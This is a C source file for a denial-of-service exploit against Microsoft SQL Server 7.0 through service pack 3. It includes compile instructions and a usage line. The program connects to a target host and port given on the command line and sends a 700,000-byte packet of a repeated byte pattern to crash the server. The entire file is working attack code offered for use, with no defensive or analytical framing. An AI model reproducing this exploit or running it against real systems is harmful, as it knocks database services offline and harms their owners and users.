 /* 

Microsoft mssql 7.0 server 
Vulnerable: MSSQL7.0 sp0 - sp1 - sp2 - sp3
 
Ported and Coded by Jonas Thambert // Sysctl.se 

To compile: gcc -o mssql7d0s mssql7d0s.c

*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>

#define PROTOCOL "tcp"

void main(int argc, char **argv) {

int sockid;
int bufsize;
int i;
char host[50];
struct sockaddr_in socketaddr;
struct hostent *hostaddr;
struct protoent *protocol;

if (argc!=3) {
 printf("MSSQL 7.0 sp0,sp1,sp2,sp3 d0S by sending large packet\n");
 printf("syntax: mssql7d0s <ip> <port>\n");
 exit(1);
}

char payload[700000];
 for(i=0;i<700000;i+=16)memcpy(payload+i,"\x10\x00\x00\x10\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc",16);

 strcpy(host, argv[1]);

 if (!(hostaddr = gethostbyname(host))) {
    fprintf(stderr, "Error resolving host.");
    exit(1);
 }

  memset(&socketaddr, 0, sizeof(socketaddr));
  socketaddr.sin_family = AF_INET;
  socketaddr.sin_port = htons(atoi(argv[2]));
  memcpy(&socketaddr.sin_addr, hostaddr->h_addr, hostaddr->h_length);
  protocol = getprotobyname(PROTOCOL);

  sockid = socket(AF_INET, SOCK_STREAM, protocol->p_proto);
  if (sockid < 0) {
    fprintf(stderr, "Error creating socket\n");
    exit(1);
  }

  if(connect(sockid, &socketaddr, sizeof(socketaddr)) == -1) {
    fprintf(stderr, "Error connecting\n");
    exit(1);
  }

  if (send(sockid, payload, sizeof(payload), 0) == -1) {
    fprintf(stderr, "Error sending data\n");
    exit(1);
  }

 close(sockid);
 return 0;
}
